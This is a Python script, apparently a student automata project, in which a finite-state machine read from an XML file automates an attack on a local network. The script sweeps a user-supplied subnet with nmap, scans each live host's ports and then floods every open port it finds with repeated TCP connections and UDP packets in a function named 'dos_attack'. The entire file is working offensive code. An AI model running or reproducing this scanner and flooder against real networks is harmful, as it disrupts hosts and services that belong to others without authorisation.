import xml.etree.ElementTree as ET
import socket
import time
import sys
import pyfiglet
from colorama import init
from termcolor import cprint 
from pyfiglet import figlet_format
import nmap

ip_base = "192.168.2"
ip_range_num = 1
ip_range_limit = 50
port_range_num = 1
port_range_limit = 1100
power = 50
duration = 5
ip = 1
port = 1



class DFA:
    def __init__(self, states, initial, alphabet, transitions):
        self.states = states
        self.current_state = initial
        self.alphabet = alphabet
        self.transitions = transitions
    
    def transition(self, symbol):
        for transition in self.transitions:
            if transition['from'] == self.current_state and transition['read'] == symbol:
                self.current_state = transition['to']
                return True
        return False

def load_dfa_from_xml(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    states = [state.get('id') for state in root.find('states')]
    initial = root.find('initial/state').get('id')
    alphabet = [symbol.text for symbol in root.find('alphabet')]
    transitions = [{'from': transition.find('from').text,
                    'to': transition.find('to').text,
                    'read': transition.find('read').text}
                    for transition in root.find('transitions')]
    
    return DFA(states, initial, alphabet, transitions)






def scan_ips(ip_base, num):
    start = num
    end = start + 9
    ip_range = f"{ip_base}.{start}-{end}"

    nm = nmap.PortScanner()
    nm.scan(hosts=ip_range, arguments='-sn')

    ip_list = []
    for host in nm.all_hosts():
        ip_list.append(host)

    return ip_list


def get_and_remove_next_element(lst):
    if not lst:
        return "N"

    next_element = lst.pop(0)
    return next_element



def find_open_ports(ip_base, num):
    start_port = num 
    end_port = num + 256

    nm = nmap.PortScanner()
    nm.scan(hosts=ip_base, arguments=f'-p {start_port}-{end_port}')

    open_ports = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                state = nm[host][proto][port]['state']
                if state == 'open':
                    open_ports.append(port)

    return open_ports






def dos_attack(ip, port, power, duration):
    try:
        end_time = time.time() + duration
        
        while time.time() < end_time:
            # TCP attack
            try:
                sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock_tcp.connect((ip, port))
                #print(f"Successful TCP DoS attack -> {ip}:{port}")
                sock_tcp.close()
            except:
                pass
            
            # UDP attack
            try:
                sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                message = "A" * 1024  # Attack message
                sock_udp.sendto(message.encode(), (ip, port))
                #print(f"Successful UDP DoS attack -> {ip}:{port}")
                sock_udp.close()
            except Exception as e:
                print(f"Attack failed: {e}")
               
            time.sleep(1 / power)  # Power
        print(f"Successful UDP DoS attack -> {ip}:{port}") 
    except KeyboardInterrupt:
        print("Attack stopped. KEYBOARD INTERRUPT")
        return
    except socket.error:
        print("An error occurred while connecting to the target.")
        return









def main():
    global ip
    global port
    global ip_range_num
    global ip_range_limit
    global port_range_num
    global port_range_limit

    dfa = load_dfa_from_xml('automata.xml')
    
    while True:
        print("Current state:", dfa.current_state)
        if dfa.current_state == 's0':
            ip_base = input("Enter an IP address (or 'exit' to quit): ")
            dfa.transition('Y')
            if ip_base.lower() == 'exit':
                print("Exiting...")
                break
        
        if dfa.current_state == 's1':
            if(ip_range_num >= ip_range_limit):
                print('IP address search limit reached')
                ip_range_num = 1
                dfa.transition('N')
            else:
                ip_addresses = scan_ips(ip_base, ip_range_num)
                if ip_addresses:
                    print(str(ip_range_num) + ' to ' + str(ip_range_num + 10) + ' IP addresses found: ' + str(ip_addresses))
                dfa.transition('Y')
                ip_range_num += 10
            
        if dfa.current_state == 's2':    
            ip = get_and_remove_next_element(ip_addresses)
            if(ip == 'N'):
                print('There are no available IP between '+ str(ip_range_num-10) +' and '+ str(ip_range_num))
                dfa.transition('N')
            else:
                print('IP to attack: '+ str(ip))
                dfa.transition('Y')

        if dfa.current_state == 's3':
            if(port_range_num >= port_range_limit):
                print('Port address search limit reached')
                port_range_num = 1
                dfa.transition('N')
            else:
                port_addresses = find_open_ports(ip, port_range_num)
                if port_addresses:
                    print(str(port_range_num) + ' to ' + str(port_range_num + 256) + ' Port addresses found: ' + str(port_addresses))
                dfa.transition('Y')
                port_range_num += 256

        if dfa.current_state == 's4':    
            port = get_and_remove_next_element(port_addresses)
            if(port == "N"):
                print('There are no available Ports between '+ str(port_range_num-256) +' and '+ str(port_range_num))
                dfa.transition('N')
            else: 
                print('Port to attack: ' + str(port))
                dfa.transition('Y')
            
        if dfa.current_state == 's5':
            dos_attack(ip, port, power, duration)
            dfa.transition('Y')

        

if __name__ == "__main__":
    main()